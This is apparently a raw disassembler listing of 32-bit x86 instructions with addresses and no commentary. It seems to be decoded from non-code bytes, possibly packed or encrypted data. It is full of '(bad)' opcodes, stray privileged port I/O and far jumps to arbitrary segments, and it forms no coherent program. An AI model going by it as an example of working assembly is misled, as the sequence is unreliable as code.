  4185fc:	sbb    DWORD PTR [esi-0x80],0x5adcdcac
  418603:	adc    eax,0x20d2fc9d
  418608:	sub    ecx,DWORD PTR [eax+0x7732b33a]
  41860e:	cmp    eax,0xf4b71c80
  418613:	cmp    BYTE PTR [ebx],ch
  418615:	popa   
  418616:	mov    cl,ah
  418618:	fisttp WORD PTR [esi-0x1ea1dd71]
  41861e:	out    dx,eax
  41861f:	sbb    ebp,DWORD PTR [edi*4+0x68a7c516]
  418626:	mov    ecx,0x3db8ad09
  41862b:	pop    ds
  41862c:	retf   0x5b0f
  41862f:	(bad)  
  418630:	push   ebx
  418631:	jge    0x4185ec
  418633:	mov    fs,eax
  418635:	jno    0x4186ad
  418637:	xchg   esi,eax
  418638:	mov    ds,edi
  41863a:	mov    al,dh
  41863c:	lods   eax,DWORD PTR ds:[esi]
  41863d:	test   DWORD PTR [ebx+0x170fd9f4],0x5d7ec994
  418647:	or     DWORD PTR [edx+eax*2+0x69],ebx
  41864b:	shr    DWORD PTR [ecx],cl
  41864d:	fs call 0xacc3:0xbb79367
  418655:	ror    BYTE PTR [esi],cl
  418657:	adc    BYTE PTR [edx-0x69],cl
  41865a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41865b:	std    
  41865c:	js     0x418684
  41865e:	push   edi
  41865f:	sbb    dh,BYTE PTR [edx+0x6b]
  418662:	mov    esp,0x61edbe17
  418667:	lock push 0x37a5b296
  41866d:	cmc    
  41866e:	aas    
  41866f:	aam    0x82
  418671:	cld    
  418672:	(bad)  
  418673:	and    ecx,DWORD PTR ds:0xa9951015
  418679:	pushf  
  41867a:	xor    ecx,DWORD PTR [edx+0x53]
  41867d:	loop   0x41864f
  41867f:	or     BYTE PTR ds:0xacb5b255,bl
  418685:	inc    esp
  418686:	ja     0x41865b
  418688:	fnsave [edi+eiz*1+0x20a01909]
  41868f:	xchg   edx,eax
  418690:	loop   0x418627
  418692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418693:	inc    ecx
  418694:	(bad)  
  418695:	pop    eax
  418696:	leave  
  418697:	add    DWORD PTR [edi+edx*4],ebp
  41869a:	xchg   DWORD PTR [eax+0x3e],eax
  41869d:	mov    dh,0x59
  41869f:	lds    esi,FWORD PTR [ecx+edx*1+0x2ce26d70]
  4186a6:	test   BYTE PTR [eax+0x7e7fca7f],dh
  4186ac:	push   edi
  4186ad:	jg     0x41864f
  4186af:	mov    bh,0xb
  4186b1:	(bad)  
  4186b2:	out    0xd6,eax
  4186b4:	or     BYTE PTR [ecx],cl
  4186b6:	jp     0x4186d6
  4186b8:	scas   eax,DWORD PTR es:[edi]
  4186b9:	mov    dh,0x40
  4186bb:	repnz arpl WORD PTR [edi+0x7cf54fac],bx
  4186c2:	lahf   
  4186c3:	sub    ah,ah
  4186c5:	inc    esi
  4186c6:	xor    al,0x2d
  4186c8:	fisttp QWORD PTR [edi-0x4e]
  4186cb:	std    
  4186cc:	(bad)  
  4186ce:	or     al,0x4d
  4186d0:	call   0x5b79:0xa418c70
  4186d7:	mov    es,WORD PTR [ecx-0xfdc151a]
  4186dd:	pop    edi
  4186de:	sbb    eax,0x308de27d
  4186e3:	daa    
  4186e4:	test   BYTE PTR [eax],0x74
  4186e7:	inc    ecx
  4186e8:	push   ds
  4186e9:	gs pushw cs
  4186ec:	stos   BYTE PTR es:[edi],al
  4186ed:	pop    esi
  4186ee:	imul   ebp,DWORD PTR [edx],0xdaf3dc39
  4186f4:	xor    BYTE PTR ds:0xaf2a70bb,al
  4186fa:	call   0xdf25:0x2be62e6c
  418701:	add    bh,ah
  418703:	push   esp
  418704:	iret   
  418705:	mov    eax,ds:0x1aaf0336
  41870a:	rcr    DWORD PTR [edi+0x28ccf931],cl
  418710:	ss jnp 0x4186bf
  418713:	dec    esp
  418714:	mov    esi,0x3d09dfb6
  418719:	jecxz  0x418741
  41871b:	sbb    ch,BYTE PTR [ebx]
  41871d:	xor    edi,DWORD PTR [esi-0x20]
  418720:	(bad)  
  418722:	pop    eax
  418723:	adc    edi,DWORD PTR [eax-0x1de1a76a]
  418729:	shr    ecx,cl
  41872b:	and    al,0x97
  41872d:	jnp    0x418737
  41872f:	push   ds
  418730:	pop    edi
  418731:	mov    edx,0x798cd33f
  418736:	test   al,0x3a
  418738:	ja     0x41872b
  41873a:	push   es
  41873b:	faddp  st(5),st
  41873d:	mov    dl,0xa2
  41873f:	test   cl,0x68
  418742:	or     edx,DWORD PTR [ebp+0x1956bae8]
  418748:	aas    
  418749:	and    al,0xba
  41874b:	test   al,0xec
  41874d:	push   0xecc08b65
  418752:	xor    eax,0x20d6774d
  418757:	inc    eax
  418758:	in     eax,0xe7
  41875a:	mov    ah,0xf5
  41875c:	jns    0x41879c
  41875e:	jmp    0x418703
  418760:	or     edx,DWORD PTR [ebx]
  418762:	stc    
  418763:	fild   WORD PTR [edi-0x6cf8cdf7]
  418769:	shl    DWORD PTR ds:0xe8824f60,cl
  41876f:	sbb    BYTE PTR [ebp+eax*8-0x7ec5e228],al
  418776:	call   0xe354b11
  41877b:	sbb    BYTE PTR [ecx+esi*4],al
  41877e:	out    dx,eax
  41877f:	pop    esi
  418780:	jge    0x4187f5
  418782:	in     al,0xf3
  418784:	sbb    esp,DWORD PTR [edi-0x45fafc77]
  41878a:	sub    BYTE PTR [ecx],bh
  41878c:	into   
  41878d:	ins    BYTE PTR es:[edi],dx
  41878e:	xor    ecx,DWORD PTR [ebp-0x119857f7]
  418794:	push   ecx
  418795:	mov    BYTE PTR [edi+0x61b2a316],ch
  41879b:	pop    esi
  41879c:	mov    ds:0x42ae35f9,al
  4187a1:	dec    esi
  4187a2:	adc    esi,DWORD PTR gs:[ebx-0x22]
  4187a6:	loopne 0x4187f6
  4187a8:	daa    
  4187a9:	imul   ebp,ebp,0x5d
  4187ac:	dec    esi
  4187ad:	jp     0x418752
  4187af:	adc    eax,0x357245c1
  4187b4:	pop    ecx
  4187b5:	add    al,0xd5
  4187b7:	enter  0x77eb,0x4a
  4187bb:	xlat   BYTE PTR ds:[ebx]
  4187bc:	dec    ebp
  4187bd:	mov    ds:0x22b604a7,al
  4187c2:	lea    edi,[ecx-0x7b5725]
  4187c8:	mov    ch,BYTE PTR [esi-0x108ac0]
  4187ce:	mov    edx,0x80dac7b1
  4187d3:	jnp    0x4187bd
  4187d5:	dec    eax
  4187d6:	outs   dx,BYTE PTR ds:[esi]
  4187d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187d8:	pop    es
  4187d9:	ds mov ebx,0x55886c2b
  4187df:	push   es
  4187e0:	ss popf 
  4187e2:	push   es
  4187e3:	dec    ecx
  4187e4:	ins    DWORD PTR es:[edi],dx
  4187e5:	mov    ds,WORD PTR [edx-0xe]
  4187e8:	mov    al,0x32
  4187ea:	out    0x86,eax
  4187ec:	add    eax,0x560b48b
  4187f1:	sbb    BYTE PTR [edi],ah
  4187f3:	mov    si,0x4055
  4187f7:	jnp    0x418827
  4187f9:	push   esi
  4187fa:	cmp    BYTE PTR [edx+0x36],dh
  4187fd:	stos   DWORD PTR es:[edi],eax
  4187fe:	or     eax,0xf8c433b2
  418803:	sbb    dh,al
  418805:	push   0x5c
  418807:	fdiv   QWORD PTR [edi]
  418809:	call   0x60ede277
  41880e:	jbe    0x4187a8
  418810:	cmp    bh,BYTE PTR [ecx-0x358870eb]
  418816:	rol    BYTE PTR [edx-0x6930ed35],1
  41881c:	mov    edi,0xbe678729
  418821:	out    dx,al
  418822:	push   esi
  418823:	stos   BYTE PTR es:[edi],al
  418824:	cmp    al,0x33
  418826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418827:	mov    edi,0xe72acdd3
  41882c:	push   eax
  41882d:	dec    esp
  41882e:	out    dx,al
  41882f:	add    al,0xb7
  418831:	xchg   edi,eax
  418832:	xor    esp,DWORD PTR ds:0x20a76a2d
  418838:	dec    edi
  418839:	pop    ss
  41883a:	in     al,0xa4
  41883c:	pop    esi
  41883d:	mov    dl,0x4
  41883f:	xor    eax,0xf7be0b0
  418844:	lahf   
  418845:	(bad)  
  418846:	cmovg  ebx,DWORD PTR [eax-0x7a]
  41884a:	shl    DWORD PTR [ecx],cl
  41884c:	popa   
  41884d:	pop    edx
  41884e:	inc    DWORD PTR [ebp-0x1f]
  418851:	scas   eax,DWORD PTR es:[edi]
  418852:	rol    BYTE PTR [edi+0x7e53974a],cl
  418858:	push   es
  418859:	pop    esi
  41885a:	iret   
  41885b:	push   ds
  41885c:	xlat   BYTE PTR ds:[ebx]
  41885d:	(bad)  
  41885f:	mov    eax,ds:0x6474a7d8
  418864:	jecxz  0x4187ee
  418866:	push   ecx
  418867:	mov    ah,0xad
  418869:	or     BYTE PTR [edi+0x1c],0xf2
  41886d:	pop    ecx
  41886e:	ss inc ecx
  418870:	sahf   
  418871:	add    bh,BYTE PTR [eax-0x5c]
  418874:	leave  
  418875:	pushf  
  418876:	nop
  418877:	stos   DWORD PTR es:[edi],eax
  418878:	inc    esi
  418879:	data16 addr16 jb 0x41883a
  41887d:	jns    0x4188e9
  41887f:	jbe    0x418843
  418881:	jecxz  0x418894
  418883:	in     eax,dx
  418884:	push   eax
  418885:	leave  
  418886:	cmp    dh,BYTE PTR [edi+eiz*4]
  418889:	inc    esi
  41888a:	mov    eax,ds:0xba8805b0
  41888f:	xchg   ebx,eax
  418890:	ficom  DWORD PTR [edx+eiz*4+0x247e9276]
  418897:	xor    eax,0xed90630d
  41889c:	fisub  DWORD PTR [edi+ebp*1]
  41889f:	inc    esi
  4188a0:	outs   dx,BYTE PTR ds:[esi]
  4188a1:	sbb    cl,BYTE PTR [ebx+0x5720409c]
  4188a7:	ret    
  4188a8:	ins    DWORD PTR es:[edi],dx
  4188a9:	adc    esi,DWORD PTR [eax-0x72baeae0]
  4188af:	mov    edi,0xb66366c
  4188b4:	or     al,0x9e
  4188b6:	sbb    al,BYTE PTR [eax-0x2ddd40d3]
  4188bc:	daa    
  4188bd:	inc    ecx
  4188be:	jnp    0x418859
  4188c0:	jmp    0x4188d9
  4188c2:	mov    eax,0x594b1311
  4188c7:	lahf   
  4188c8:	cmc    
  4188c9:	fnstcw WORD PTR [ecx-0x3e0ea7fa]
  4188cf:	push   edi
  4188d0:	mov    eax,0xbed595f6
  4188d5:	push   ecx
  4188d6:	psubusb mm4,QWORD PTR [ebp-0xd]
  4188da:	aaa    
  4188db:	fsubr  st,st(2)
  4188dd:	jmp    0xbe60f3de
  4188e2:	xor    BYTE PTR [eax-0x4b],dl
  4188e5:	inc    ebx
  4188e6:	push   0xfffffff2
  4188e8:	and    al,BYTE PTR [ecx]
  4188ea:	ss sti 
  4188ec:	enter  0xadbb,0x72
  4188f0:	imul   ebp,DWORD PTR ds:0x1368b9c8,0xb0a6a2dc
  4188fa:	ss jp  0x41895a
  4188fd:	adc    al,0xb8
  4188ff:	outs   dx,DWORD PTR ds:[esi]
  418900:	sbb    al,BYTE PTR [ebx]
  418902:	mov    ?,ecx
  418904:	loopne 0x418951
  418906:	je     0x418931
  418908:	sub    ah,al
  41890a:	or     DWORD PTR [ebx-0x23],ebp
  41890d:	sbb    dh,BYTE PTR [esi+0x3d39d24b]
  418913:	xor    esi,DWORD PTR [edx+0x32845ed7]
  418919:	dec    esi
  41891a:	mov    bh,0x53
  41891c:	sub    dh,0xb0
  41891f:	cmp    DWORD PTR [ecx+0x59],esi
  418922:	cmp    al,0x46
  418924:	retf   0x592d
  418927:	enter  0x272a,0x3e
  41892b:	mov    ebx,0x6ca2a75b
  418930:	in     al,dx
  418931:	push   es
  418932:	or     eax,0xd1dcdb18
  418937:	xchg   edi,eax
  418938:	stos   BYTE PTR es:[edi],al
  418939:	push   ebx
  41893a:	and    al,0xff
  41893c:	inc    edi
  41893d:	pop    es
  41893e:	mov    eax,ds:0x1145fb2c
  418943:	dec    esp
  418944:	sbb    ebx,DWORD PTR [esi]
  418946:	cld    
  418947:	scas   al,BYTE PTR es:[edi]
  418948:	or     dh,dh
  41894a:	mov    dh,0x6a
  41894c:	jno    0x4188ff
  41894e:	ret    
  41894f:	rcr    ah,cl
  418951:	push   esp
  418952:	stos   DWORD PTR es:[edi],eax
  418953:	outs   dx,BYTE PTR ds:[esi]
  418954:	xchg   ebp,eax
  418955:	cmp    DWORD PTR [edi],ebp
  418957:	mov    WORD PTR [eax-0x66],gs
  41895a:	pop    edx
  41895b:	push   eax
  41895c:	cs xchg edx,eax
  41895e:	push   ebx
  41895f:	mov    al,BYTE PTR [esi+ebx*4]
  418962:	loopne 0x4189bb
  418964:	pop    ss
  418965:	sbb    BYTE PTR [edx-0x6278499],cl
  41896b:	(bad)  
  41896c:	rcr    DWORD PTR [eax+0x13],cl
  41896f:	pop    edi
  418970:	test   eax,0x8baa6e68
  418975:	sbb    bh,dh
  418977:	and    cl,BYTE PTR [esi+0x2581db63]
  41897d:	or     BYTE PTR [edi+edx*4],al
  418980:	adc    DWORD PTR [edx+0x52d6b8ee],ebp
  418986:	mov    bl,0xdf
  418988:	adc    BYTE PTR [ecx+0x160f8947],0x94
  41898f:	cwde   
  418990:	adc    eax,DWORD PTR [esi-0x15]
  418993:	in     al,dx
  418994:	mov    bl,0x17
  418996:	push   es
  418997:	ins    DWORD PTR es:[edi],dx
  418998:	shr    DWORD PTR [edi+0x39724212],cl
  41899e:	mov    dl,0x10
  4189a0:	inc    esp
  4189a1:	jae    0x418967
  4189a3:	cmc    
  4189a4:	xor    ebp,ebx
  4189a6:	bound  eax,QWORD PTR [ebp-0x704ceb4f]
  4189ac:	jle    0x4189ef
  4189ae:	sbb    al,BYTE PTR [ebp+0x59]
  4189b1:	xchg   ebp,eax
  4189b2:	inc    ebx
  4189b3:	nop
  4189b4:	cmp    DWORD PTR [eax+0x1734f3eb],edx
  4189ba:	test   DWORD PTR [ebx],0x926fabfc
  4189c0:	(bad)  
  4189c1:	dec    esi
  4189c2:	xchg   DWORD PTR [edi],eax
  4189c4:	call   0xc8204e0e
  4189c9:	xor    ch,BYTE PTR [ebp-0x4a]
  4189cc:	xchg   esi,eax
  4189cd:	aas    
  4189ce:	cmp    DWORD PTR [esi+0x2e],eax
  4189d1:	inc    esi
  4189d2:	stos   DWORD PTR es:[edi],eax
  4189d3:	fwait
  4189d4:	es mov esp,0x2b1002e4
  4189da:	add    eax,0xf69b5f92
  4189df:	sbb    ah,cl
  4189e1:	test   eax,0x32469d08
  4189e6:	aaa    
  4189e7:	repnz test DWORD PTR [eax+edx*1+0x75],eax
  4189ec:	popf   
  4189ed:	lods   eax,DWORD PTR ds:[esi]
  4189ee:	push   es
  4189ef:	mov    ch,0x1c
  4189f1:	mov    esi,0x4fbfaf
  4189f6:	dec    edx
  4189f7:	sub    ah,ah
  4189f9:	sbb    ebp,DWORD PTR [edx]
  4189fb:	dec    esp
  4189fc:	xchg   ecx,eax
  4189fd:	or     al,0x6c
  4189ff:	push   edx
  418a00:	mov    esp,esi
  418a02:	xchg   ecx,eax
  418a03:	and    ecx,edx
  418a05:	adc    eax,0x3ef34d3c
  418a0a:	push   0xffffff88
  418a0c:	and    edx,DWORD PTR [eax]
  418a0e:	push   ss
  418a0f:	xchg   edx,eax
  418a10:	mov    al,ds:0x7811a9f6
  418a15:	push   ds
  418a16:	repz mov dl,0xc2
  418a19:	adc    esi,DWORD PTR [ecx+0x215f3b20]
  418a1f:	sub    al,0xb
  418a21:	push   0xdf464411
  418a26:	data16 mov al,0x7c
  418a29:	fidiv  WORD PTR [eax]
  418a2b:	mov    bl,0x92
  418a2d:	push   esp
  418a2e:	mov    edi,0xbe671e7a
  418a33:	outs   dx,BYTE PTR ds:[esi]
  418a34:	adc    eax,0x94851ea0
  418a39:	ss in  eax,0xa0
  418a3c:	clc    
  418a3d:	out    0xb3,eax
  418a3f:	sub    BYTE PTR [edx-0x3d],0x74
  418a43:	or     al,BYTE PTR [edx]
  418a45:	les    esp,FWORD PTR [ecx+0xb]
  418a48:	add    BYTE PTR [esi+0x69],al
  418a4b:	xor    ah,cl
  418a4d:	xchg   edi,eax
  418a4e:	sub    dl,dl
  418a50:	mov    al,ds:0x459f278f
  418a55:	push   0xd664ba5b
  418a5a:	sar    ebp,cl
  418a5c:	push   cs
  418a5d:	(bad)  
  418a5e:	push   ebp
  418a5f:	adc    BYTE PTR [esp+edx*2],cl
  418a62:	ja     0x418ac3
  418a64:	push   0xffffffb0
  418a66:	cdq    
  418a67:	xchg   edx,eax
  418a68:	out    dx,eax
  418a69:	jo     0x418a8e
  418a6b:	or     al,0x49
  418a6d:	and    ecx,esi
  418a6f:	adc    dh,BYTE PTR ds:0xb32c3d91
  418a75:	and    ebx,esi
  418a77:	dec    ecx
  418a78:	add    BYTE PTR [esi],bh
  418a7a:	push   edx
  418a7b:	pushf  
  418a7c:	mov    BYTE PTR [esp+ebx*8+0x55],dh
  418a80:	xchg   esp,eax
  418a81:	and    eax,0x464b4536
  418a86:	lahf   
  418a87:	out    dx,eax
  418a88:	data16 sub BYTE PTR [ecx-0x17],ch
  418a8c:	and    ecx,DWORD PTR [edx-0x34696616]
  418a92:	shl    BYTE PTR ds:0x2bdc9285,cl
  418a98:	cmp    dl,BYTE PTR [edx+edx*1-0x5b]
  418a9c:	int    0xf8
  418a9e:	mov    al,ds:0x8762f283
  418aa3:	lods   eax,DWORD PTR ds:[esi]
  418aa4:	mov    ch,cl
  418aa6:	fimul  WORD PTR [ecx+esi*8]
  418aa9:	or     bl,BYTE PTR [ebx]
  418aab:	xchg   ch,ah
  418aad:	rcl    BYTE PTR [esi-0x12],1
  418ab0:	adc    ebp,edx
  418ab2:	scas   eax,DWORD PTR es:[edi]
  418ab3:	xchg   edi,eax
  418ab4:	xchg   ebp,eax
  418ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ab6:	inc    ebx
  418ab7:	mov    bl,0xbc
  418ab9:	daa    
  418aba:	ja     0x418b0b
  418abc:	sub    ah,BYTE PTR [edi+eax*8-0xa]
  418ac0:	into   
  418ac1:	stc    
  418ac2:	mov    eax,ds
  418ac4:	add    bh,0xc2
  418ac7:	(bad)  
  418ac9:	xor    DWORD PTR [eax],ecx
  418acb:	or     BYTE PTR [eax+0x99b1888],cl
  418ad1:	add    eax,0x292aa900
  418ad6:	call   0x70d8a369
  418adb:	mov    eax,0x39754d2d
  418ae0:	cmp    bl,BYTE PTR [ecx+0x38]
  418ae3:	jl     0x418b22
  418ae5:	adc    BYTE PTR ds:0x77be1d8,ah
  418aeb:	loop   0x418b07
  418aed:	cmp    dl,BYTE PTR [eax-0x2aa496e1]
  418af3:	dec    BYTE PTR [edi+0x2eeb03fd]
  418af9:	mov    ch,0xc6
  418afb:	scas   eax,DWORD PTR es:[edi]
  418afc:	je     0x418ac9
  418afe:	lea    edi,[ecx+0x5f]
  418b01:	out    dx,eax
  418b02:	in     eax,dx
  418b03:	push   esp
  418b04:	inc    edx
  418b05:	enter  0x5e4f,0x5
  418b09:	lods   al,BYTE PTR ds:[esi]
  418b0a:	rol    DWORD PTR [esi+0x3cd17226],1
  418b10:	xor    bl,BYTE PTR [ebp-0x296fc254]
  418b16:	out    dx,al
  418b17:	dec    edx
  418b18:	cli    
  418b19:	test   eax,0xde17ca9e
  418b1e:	aam    0x3b
  418b20:	jp     0x418b58
  418b22:	jb     0x418ac0
  418b24:	sbb    ebx,DWORD PTR [esi]
  418b26:	or     al,0xc7
  418b28:	push   0x415e4f7f
  418b2d:	fisub  DWORD PTR [ebp-0x1e]
  418b30:	mov    BYTE PTR [eax+0x2],bh
  418b33:	or     cl,dh
  418b35:	adc    al,0x67
  418b37:	jns    0x418afd
  418b39:	imul   ebp,DWORD PTR [ebx-0x1f685b87],0x2fe6ffe8
  418b43:	push   es
  418b44:	xor    bh,BYTE PTR [edx]
  418b46:	stos   DWORD PTR es:[edi],eax
  418b47:	pop    edx
  418b48:	add    edx,DWORD PTR [ebx-0x17]
  418b4b:	fwait
  418b4c:	retf   0x941e
  418b4f:	mov    eax,0x288f2e8d
  418b54:	jmp    0x2399:0xafd5143a
  418b5b:	ja     0x418b7d
  418b5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b5e:	cmp    dl,BYTE PTR [ecx+0x48ac1ee9]
  418b64:	sub    ch,BYTE PTR [eax-0x5593692b]
  418b6a:	xchg   edi,eax
  418b6b:	sbb    eax,0xdebe4a35
  418b70:	mov    ecx,eax
  418b72:	or     BYTE PTR [edx],0x37
  418b75:	mov    fs,WORD PTR [eax]
  418b77:	pop    edi
  418b78:	call   0xc8ca3ade
  418b7d:	or     BYTE PTR [ecx+0x24a84ad4],0xbd
  418b84:	je     0x418be0
  418b86:	xor    ecx,DWORD PTR [edi]
  418b88:	jge    0x418b79
  418b8a:	and    eax,0x827e83d
  418b8f:	jo     0x418bcf
  418b91:	das    
  418b92:	lods   al,BYTE PTR ds:[esi]
  418b93:	cmp    DWORD PTR [edx+edi*1-0x1a],0x81f5c3cf
  418b9b:	add    ebx,eax
  418b9d:	push   cs
  418b9e:	call   FWORD PTR ds:[esi]
  418ba1:	sbb    al,0xfa
  418ba3:	jmp    0xbd40185e
  418ba8:	pop    ecx
  418baa:	(bad)  
  418bab:	xchg   edx,eax
  418bac:	sbb    al,0xfe
  418bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418baf:	or     eax,0xb02d64af
  418bb4:	mov    ax,0xb811
  418bb8:	es aam 0x42
  418bbb:	jmp    0x418be7
  418bbd:	pushf  
  418bbe:	ss mov ah,0xf1
  418bc1:	(bad)  
  418bc2:	push   edx
  418bc3:	dec    edi
  418bc4:	sbb    al,0x8c
  418bc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bc7:	jno    0x418bf2
  418bc9:	push   edi
  418bca:	xor    esp,DWORD PTR [ebx+0x7331675e]
  418bd0:	cli    
  418bd1:	jmp    FWORD PTR [esp+esi*8+0x736c8a60]
  418bd8:	push   ds
  418bd9:	ss adc eax,0x7335b964
  418bdf:	jmp    0x32a746b4
  418be4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418be5:	pop    eax
  418be6:	add    eax,0x7aac568a
  418beb:	jle    0x418c60
  418bed:	je     0x418c45
  418bef:	lods   eax,DWORD PTR ds:[esi]
  418bf0:	fldenv [esi+0x6eef7bbe]
  418bf6:	cwde   
  418bf7:	ret    
  418bf8:	int3   
  418bf9:	leave  
  418bfa:	std    
  418bfb:	dec    ebp
  418bfc:	aaa    
  418bfd:	sbb    dh,dl
  418bff:	popa   
  418c00:	scas   al,BYTE PTR es:[edi]
  418c01:	(bad)  
  418c02:	loope  0x418c0d
  418c04:	push   ss
  418c05:	inc    eax
  418c06:	retf   0x65fb
  418c09:	add    BYTE PTR [ebp+ecx*4-0x11],bl
  418c0d:	aam    0xc3
  418c0f:	bound  esi,QWORD PTR [ecx-0x3060fbd4]
  418c15:	or     ebx,DWORD PTR [edi+0x6ed413ef]
  418c1b:	jbe    0x418bf7
  418c1d:	fidiv  WORD PTR [esi]
  418c1f:	dec    edx
  418c20:	dec    ecx
  418c21:	stc    
  418c22:	cmp    al,cl
  418c24:	or     edi,0x2e
  418c27:	add    BYTE PTR [ecx+0x69],dh
  418c2a:	and    ebp,ecx
  418c2c:	in     al,dx
  418c2d:	shl    DWORD PTR [eax+0x29],1
  418c30:	sahf   
  418c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c32:	popa   
  418c33:	jmp    0x418cae
  418c35:	mov    dh,0xd5
  418c37:	jecxz  0x418c65
  418c39:	outs   dx,BYTE PTR ds:[esi]
  418c3a:	fld    QWORD PTR [ebp-0x7b3e407c]
  418c40:	pop    edx
  418c41:	mov    ebx,0x6cc88157
  418c46:	jno    0x418c4a
  418c48:	mov    ebp,0x7003b814
  418c4d:	shl    BYTE PTR [edx],0x2d
  418c50:	mov    esi,edx
  418c52:	mov    edi,0xe586f49
  418c57:	and    esp,DWORD PTR [ebp+0x14]
  418c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c5b:	out    dx,eax
  418c5c:	sbb    BYTE PTR [ebx],0x6
  418c5f:	xchg   edx,eax
  418c60:	and    DWORD PTR [eax-0x306718d4],esi
  418c66:	fistp  WORD PTR [ebx+0x84bd517]
  418c6c:	add    eax,0x6e7c8109
  418c71:	cli    
  418c72:	popf   
  418c73:	gs add eax,0xa80ca9f3
  418c79:	lock push ecx
  418c7b:	mov    BYTE PTR ds:[esp+edx*2+0x65c3faf8],bh
  418c83:	push   ebp
  418c84:	add    eax,edi
  418c86:	sub    eax,0xf792fc11
  418c8b:	aas    
  418c8c:	das    
  418c8d:	fsub   DWORD PTR [edx]
  418c8f:	lods   eax,DWORD PTR ds:[esi]
  418c90:	mov    esi,0x172a9bb3
  418c95:	pop    es
  418c96:	cmp    al,0x59
  418c98:	adc    ebp,DWORD PTR [esi]
  418c9a:	cmp    al,0x4c
  418c9c:	out    0x24,eax
  418c9e:	add    esp,DWORD PTR [esi+edi*2-0x17]
  418ca2:	sub    eax,0x341f1318
  418ca7:	ins    BYTE PTR es:[edi],dx
  418ca8:	outs   dx,DWORD PTR ds:[esi]
  418ca9:	gs pop eax
  418cab:	addr16 mov bl,0x1e
  418cae:	add    DWORD PTR [edi],eax
  418cb0:	ficom  DWORD PTR [esi+0x7884b0cf]
  418cb6:	sbb    al,0x36
  418cb8:	push   edx
  418cb9:	xor    ch,BYTE PTR [ecx]
  418cbb:	shld   ebx,ebx,cl
  418cbe:	fild   QWORD PTR [eax-0x13]
  418cc1:	mov    bl,0xb0
  418cc3:	jecxz  0x418d22
  418cc5:	test   BYTE PTR [esi+ebx*8],0x4d
  418cc9:	add    dl,bl
  418ccb:	jmp    0x425c:0x1dae22f4
  418cd2:	xchg   bl,ah
  418cd4:	xchg   bl,bl
  418cd6:	pop    eax
  418cd7:	loopne 0x418d18
  418cd9:	xchg   edi,eax
  418cda:	sbb    cl,BYTE PTR [edx]
  418cdc:	out    0xa9,eax
  418cde:	add    al,0x3d
  418ce0:	jno    0x418d10
  418ce2:	xchg   dh,dh
  418ce4:	fcomp  QWORD PTR [ebx-0x2dfa739c]
  418cea:	iret   
  418ceb:	cmp    esp,DWORD PTR [ebx-0x66937112]
  418cf1:	mov    bh,0xc4
  418cf3:	push   edx
  418cf4:	test   al,0xf2
  418cf6:	mov    esi,0xca0495c3
  418cfb:	pop    esp
  418cfc:	sbb    bl,dh
  418cfe:	jns    0x418ca1
  418d00:	mov    esp,0x8a453690
  418d05:	mov    esp,0x58159756
  418d0a:	jecxz  0x418d66
  418d0c:	hlt    
  418d0d:	sbb    DWORD PTR ds:0xb99b4030,esi
  418d13:	adc    bh,BYTE PTR es:[edi+0xc79182d]
  418d1a:	out    dx,al
  418d1b:	add    esi,esp
  418d1d:	aam    0xb0
  418d1f:	pop    ebp
  418d20:	dec    BYTE PTR ds:0x8075b26b
  418d26:	inc    ecx
  418d27:	mov    ah,ah
  418d29:	or     BYTE PTR [ecx],ch
  418d2b:	rol    DWORD PTR [edx-0x79],0x91
  418d2f:	test   dh,cl
  418d31:	pcmpgtb mm3,QWORD PTR gs:[edx+0x4c]
  418d36:	fcmovu st,st(6)
  418d38:	jecxz  0x418d3f
  418d3a:	mov    gs,ebp
  418d3c:	mov    dl,BYTE PTR [ebx]
  418d3e:	inc    edi
  418d3f:	cdq    
  418d40:	test   al,0xe0
  418d42:	cwde   
  418d43:	fstp   st(3)
  418d45:	imul   edx,DWORD PTR [edi],0xffffff86
  418d48:	fwait
  418d49:	jnp    0x418d36
  418d4b:	(bad)  
  418d4c:	call   0x5472:0x9456f308
  418d53:	enter  0x38a0,0xe8
  418d57:	adc    BYTE PTR [ebp+0x6d],dl
  418d5a:	or     cl,BYTE PTR [edx-0x51]
  418d5d:	push   esp
  418d5e:	mov    eax,0xb821b00e
  418d63:	xchg   edi,eax
  418d64:	ds das 
  418d66:	jno    0x418d32
  418d68:	xor    cl,BYTE PTR [esi-0xe]
  418d6b:	mov    bl,0x1d
  418d6d:	ret    0x8492
  418d70:	add    edi,DWORD PTR [esi]
  418d72:	ror    BYTE PTR [ebx+0x414e0295],0x7e
  418d79:	xchg   edx,eax
  418d7a:	loope  0x418d37
  418d7c:	mov    ah,ch
  418d7e:	pop    edx
  418d7f:	into   
  418d80:	and    BYTE PTR [esi+ebx*4+0x47800b98],bh
  418d87:	bound  ebx,QWORD PTR [ebx+0x16]
  418d8a:	aas    
  418d8b:	les    esi,FWORD PTR [edx-0x77]
  418d8e:	test   BYTE PTR [esi+0x23],0xdd
  418d92:	rcr    DWORD PTR [edx+0x6a6d925f],0xf
  418d99:	ss and esp,ecx
  418d9c:	(bad)  
  418d9d:	pushf  
  418d9e:	or     ah,dl
  418da0:	xor    dl,BYTE PTR [eax+eiz*8]
  418da3:	sar    bl,0x27
  418da6:	cdq    
  418da7:	stos   BYTE PTR es:[edi],al
  418da8:	imul   esp,DWORD PTR [edi+ecx*4-0x5b],0x28
  418dad:	cmp    ah,bl
  418daf:	scas   al,BYTE PTR es:[edi]
  418db0:	loop   0x418dd1
  418db2:	leave  
  418db3:	cmc    
  418db4:	lock mov bl,0xc8
  418db7:	jle    0x418e24
  418db9:	push   ebx
  418dba:	or     DWORD PTR ds:0xc526ef26,0x6ca410
  418dc4:	jno    0x418db7
  418dc6:	inc    ebp
  418dc7:	jnp    0x418d62
  418dc9:	sbb    cl,BYTE PTR [eax]
  418dcb:	outs   dx,DWORD PTR ds:[esi]
  418dcc:	jge    0x418e05
  418dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dcf:	fld    DWORD PTR [ecx]
  418dd1:	add    bl,BYTE PTR [ebx]
  418dd3:	inc    edx
